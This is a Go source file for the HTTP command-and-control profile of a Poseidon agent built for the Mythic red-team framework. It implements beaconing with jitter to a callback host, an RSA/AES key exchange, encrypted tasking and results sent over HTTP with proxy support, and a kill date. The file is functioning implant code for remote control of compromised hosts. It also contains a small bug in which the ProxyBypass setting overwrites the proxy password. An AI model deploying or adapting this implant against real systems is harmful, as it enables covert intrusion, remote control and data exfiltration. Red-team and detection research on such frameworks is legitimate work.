//go:build (linux || darwin || windows) && http

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/crypto"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
)

type C2HTTP struct {
	BaseURL               string
	PostURI               string
	ProxyURL              string
	ProxyUser             string
	ProxyPass             string
	ProxyBypass           bool
	Interval              int
	Jitter                int
	HeaderList            map[string]string
	ExchangingKeys        bool
	Key                   string
	RsaPrivateKey         *rsa.PrivateKey
	Killdate              time.Time
	ShouldStop            bool
	stoppedChannel        chan bool
	interruptSleepChannel chan bool
}

func (e C2HTTP) MarshalJSON() ([]byte, error) {
	alias := map[string]interface{}{
		"BaseURL":       e.BaseURL,
		"PostURI":       e.PostURI,
		"ProxyURL":      e.ProxyURL,
		"ProxyUser":     e.ProxyUser,
		"ProxyPass":     e.ProxyPass,
		"ProxyBypass":   e.ProxyBypass,
		"Interval":      e.Interval,
		"Jitter":        e.Jitter,
		"Headers":       e.HeaderList,
		"EncryptionKey": e.Key,
		"KillDate":      e.Killdate,
	}
	return json.Marshal(alias)
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func parseURLAndPort(host string, port uint) string {
	var final_url string
	var last_slash int
	if port == 443 && strings.Contains(host, "https://") {
		final_url = host
	} else if port == 80 && strings.Contains(host, "http://") {
		final_url = host
	} else {
		if len(host) < 9 {
			utils.PrintDebug(fmt.Sprintf("callbackhost length is wrong, exiting: %s\n", host))
			os.Exit(1)
		}
		last_slash = strings.Index(host[8:], "/")
		if last_slash == -1 {
			//there is no 3rd slash
			final_url = fmt.Sprintf("%s:%d", host, port)
		} else {
			//there is a 3rd slash, so we need to splice in the port
			last_slash += 8 // adjust this back to include our offset initially
			//fmt.Printf("index of last slash: %d\n", last_slash)
			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
			final_url = fmt.Sprintf("%s:%d%s", host[0:last_slash], port, host[last_slash:])
		}
	}
	if final_url[len(final_url)-1:] != "/" {
		final_url = final_url + "/"
	}
	return final_url
}
func init() {
	// Read directly from config package instead of decoding base64
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", config.HTTPKilldate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error parsing killdate, using far future: %v\n", err))
		killDateTime = time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)
	}

	profile := C2HTTP{
		BaseURL:               parseURLAndPort(config.HTTPCallbackHost, uint(config.HTTPCallbackPort)),
		PostURI:               config.HTTPPostUri,
		ProxyUser:             config.HTTPProxyUser,
		ProxyPass:             config.HTTPProxyPass,
		Key:                   config.HTTPAesPsk,
		Killdate:              killDateTime,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		interruptSleepChannel: make(chan bool, 1),
	}

	profile.Interval = config.HTTPInterval
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	profile.Jitter = config.HTTPJitter
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.HeaderList = config.HTTPHeaders

	if config.HTTPProxyHost != "" && len(config.HTTPProxyHost) > 3 {
		profile.ProxyURL = parseURLAndPort(config.HTTPProxyHost, uint(config.HTTPProxyPort))
		if config.HTTPProxyUser != "" && config.HTTPProxyPass != "" {
			profile.ProxyUser = config.HTTPProxyUser
			profile.ProxyPass = config.HTTPProxyPass
		}
	}

	profile.ProxyBypass = config.HTTPProxyBypass
	profile.ExchangingKeys = config.HTTPEncryptedExchange

	RegisterAvailableC2Profile(&profile)
}
func (c *C2HTTP) Sleep() {
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(GetSleepTime())):
	}
}
func (c *C2HTTP) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							c.Sleep()
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				c.Sleep()
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}
func (c *C2HTTP) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to http\n")
	<-c.stoppedChannel
	utils.PrintDebug("http fully stopped\n")
}
func (c *C2HTTP) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "BaseURL":
		c.BaseURL = value
	case "PostURI":
		c.PostURI = value
	case "ProxyUser":
		c.ProxyUser = value
	case "ProxyPass":
		c.ProxyPass = value
	case "ProxyBypass":
		c.ProxyPass = value
	case "EncryptionKey":
		c.Key = value
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "Headers":
		if err := json.Unmarshal([]byte(value), &c.HeaderList); err != nil {
			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
		}
	}
}
func (c *C2HTTP) GetSleepInterval() int {
	return c.Interval
}
func (c *C2HTTP) GetSleepJitter() int {
	return c.Jitter
}
func (c *C2HTTP) GetKillDate() time.Time {
	return c.Killdate
}
func (c *C2HTTP) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2HTTP) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2HTTP) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2HTTP) ProfileName() string {
	return "http"
}

func (c *C2HTTP) IsP2P() bool {
	return false
}
func (c *C2HTTP) GetPushChannel() chan structs.MythicMessage {
	return nil
}

// CheckIn a new agent
func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			c.Sleep()
			continue
		} else {
			resp := c.SendMessage(raw)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				c.Sleep()
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				SetAllEncryptionKeys(c.Key)
				return response
			} else {
				c.Sleep()
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2HTTP) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}
func (c *C2HTTP) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2HTTP) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2HTTP) IsRunning() bool {
	return !c.ShouldStop
}

// htmlPostData HTTP POST function
func (c *C2HTTP) SendMessage(sendData []byte) []byte {
	defer func() {
		// close all idle connections
		client.CloseIdleConnections()
	}()
	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
	//log.Println("Sending POST request to url: ", targeturl)
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	//fmt.Printf("Sending: %v\n", string(sendData))
	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	//utils.PrintDebug(string(sendDataBase64))
	if len(c.ProxyURL) > 0 {
		proxyURL, _ := url.Parse(c.ProxyURL)
		tr.Proxy = http.ProxyURL(proxyURL)
	} else if !c.ProxyBypass {
		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
		tr.Proxy = http.ProxyFromEnvironment
	}

	contentLength := len(sendDataBase64)
	//byteBuffer := bytes.NewBuffer(sendDataBase64)
	// bail out of trying to send data after 5 failed attempts
	for i := 0; i < 5; i++ {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
			return []byte{}
		}
		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
		today := time.Now()
		if today.After(c.Killdate) {
			utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
			os.Exit(1)
		}
		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
			continue
		}
		req.ContentLength = int64(contentLength)
		// set headers
		for key, val := range c.HeaderList {
			if key == "Host" {
				req.Host = val
			} else if key == "User-Agent" {
				req.Header.Set(key, val)
				tr.ProxyConnectHeader = http.Header{}
				tr.ProxyConnectHeader.Add("User-Agent", val)
			} else if key == "Content-Length" {
				continue
			} else {
				req.Header.Set(key, val)
			}
		}
		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			// setting both proxy-auth and basic auth for compatability with more proxies
			req.SetBasicAuth(c.ProxyUser, c.ProxyPass)
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)

		}
		resp, err := client.Do(req)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if resp.StatusCode != 200 {
			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
			err = resp.Body.Close()
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
			}
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
			err = resp.Body.Close()
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
			}
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		err = resp.Body.Close()
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
		}
		//utils.PrintDebug(fmt.Sprintf("raw response: %s\n", string(body)))
		raw, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw := c.decryptMessage(raw[36:])
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
				IncrementFailedConnection(c.ProfileName())
				c.Sleep()
				continue
			} else {
				if i > 0 {
					utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
				}
				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
				return enc_raw
			}
		} else {
			if i > 0 {
				utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
			}
			//fmt.Printf("response: %v\n", string(raw))
			return raw[36:]
		}

	}
	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
	return make([]byte, 0) //shouldn't get here
}

func (c *C2HTTP) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2HTTP) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
